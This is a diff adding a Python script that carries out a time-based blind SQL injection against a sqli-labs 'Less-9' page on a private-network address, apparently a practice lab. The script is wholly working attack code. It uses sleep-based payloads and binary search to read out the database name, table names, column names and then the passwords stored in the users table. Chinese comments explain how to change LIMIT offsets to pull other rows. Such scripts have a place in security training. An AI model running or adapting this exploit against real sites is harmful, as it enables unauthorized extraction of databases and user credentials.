@@ -1,0 +1,108 @@
+import requests
+url = "http://192.168.19.128/sql/Less-9/index.php%s"
+
+def database_len():
+    print('***database_len***')
+    payload = "?id=1' and if(length(database())>%s,sleep(0),sleep(5)) --+"
+    for i in range(1,20):
+        p = payload % str(i)
+        print(url % p)
+        
+        r = requests.get(url % p)
+        r = r.elapsed.seconds
+        if  r < 2:
+            print("database_name_len_more_than"+str(i))
+        else:
+            print("database_len：",i)
+            break
+database_len()
+
+def database_name():
+    print("***database_name***")
+    payload = "?id=1' and if(ascii(substr(database(),%s,1))>%s,sleep(0),sleep(5)) --+"
+    database=''
+    for i in range(1,15):
+    	#如果数据库名可能超过15，请更换更大的值
+        max=126  #ASCII~
+        min=30   #ASCII空格
+        while abs(max-min)>1:
+            mid=int((max+min)/2)
+            p = payload % (str(i),str(mid))
+            print(url % p)
+            r = requests.get(url % p)
+            r = r.elapsed.seconds
+            if r < 5:
+                min = mid
+            else:
+                max = mid
+        database=database+chr(max)
+        print("database_name: %s" % database)
+database_name()
+
+def table_name():
+    print("***table_name***")
+    payload = "?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),%s,1)) >%s,sleep(0),sleep(5)) --+"
+    #可以通过更换limit的参数进行更换表操作 例如 limit 0,1     limit 1,1
+    database=''
+    for i in range(1,15):
+        max=126
+        min=32
+        while abs(max-min)>1:
+            mid=int((max+min)/2)
+            p = payload % (str(i),str(mid))
+            print(url % p)
+            r = requests.get(url % p)
+            r = r.elapsed.seconds
+            if r < 5:
+                min = mid
+            else:
+                max = mid
+        database=database+chr(max)
+        print("table_name: %s" % database)    
+table_name()
+
+def column_name():
+    print("***column_name***")
+    payload = "?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 2,1),%s,1)) >%s,sleep(0),sleep(5)) --+"
+    #可以通过更换limit的参数进行更换字段操作 例如 limit 0,1     limit 1,1
+    #users是上面跑出来的表名
+    database=''
+    for i in range(1,15):
+        max=126
+        min=32
+        while abs(max-min)>1:
+            mid=int((max+min)/2)
+            p = payload % (str(i),str(mid))
+            print(url % p)
+            r = requests.get(url % p)
+            r = r.elapsed.seconds
+            if r < 5:
+                min = mid
+            else:
+                max = mid
+        database=database+chr(max)
+        print("column_name: %s" % database)    
+column_name()
+
+def key_name():
+    print("***key_name***")
+    payload = "?id=1' and if(ascii(substr((select password from users  limit 0,1),%s,1)) >%s,sleep(0),sleep(5)) --+"
+    #可以通过更换limit的参数进行更换数据操作 例如 limit 0,1     limit 1,1
+    #users是上面跑出来的表名，password是上面跑出来的字段名
+    database=''
+    for i in range(1,15):
+        max=126
+        min=32
+        while abs(max-min)>1:
+            mid=int((max+min)/2)
+            p = payload % (str(i),str(mid))
+            print(url % p)
+            r = requests.get(url % p)
+            r = r.elapsed.seconds
+            if r < 5:
+                min = mid
+            else:
+                max = mid
+        database=database+chr(max)
+        print("key_name: %s" % database)
+key_name()
